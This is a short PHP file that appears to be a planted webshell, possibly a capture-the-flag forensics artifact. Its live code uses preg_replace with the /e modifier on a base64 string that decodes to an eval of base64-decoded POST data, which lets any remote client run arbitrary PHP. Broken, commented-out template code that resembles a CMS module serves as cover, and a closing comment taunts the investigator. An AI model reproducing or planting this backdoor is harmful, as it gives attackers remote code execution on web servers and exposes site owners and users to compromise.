<?php 
@$a = $_POST['x']; 
if(isset($a)){ 
@preg_replace("/\[(.*)\]/e",'\\1',base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=')); 
} 
/*
			//获取默认模板
			$template_config_file = PC_PATH.'templates'.DIRECTORY_SEPARATOR.pc_base::load_config('system', 'tpl_name').DIRECTORY_SEPARATOR.'yp'.DIRECTORY_SEPARATOR.'companytplnames.php';
			if (file_exists($template_config_file)) {
				$companytplnames = include $template_config_file;
				if (is_array($companytplnames) && !empty($companytplnames)) {
					foreach ($companytplnames as $k => $tpl) {
						if ($tpl['defaulttpl']) $default_tpl_dir = $tpl['dir'];
						break;
					}
					$memberinfo = $this->memberinfo;
				} else {
					$default_tpl_dir = 'com_default';
				}
			} else {
				$default_tpl_dir = 'com_default';
			}
			$menu_user = array2string($menu_user);
			if ($yp_setting['enable_rewrite']) {
				$url = APP_PATH.'web-'.$userid.'.html';
			else {
				$default_tpl_dir = 'com_default';}
			
			else {
				$url = APP_PATH.'index.php?m=yp&c=com_index&userid='.$userid;
			}
*/
/*
You eventually found me
I am a hacker from Georgia
You are doing too much food at your upload
Used tshark to make traffic records?
Then you go to the traffic to find me
?>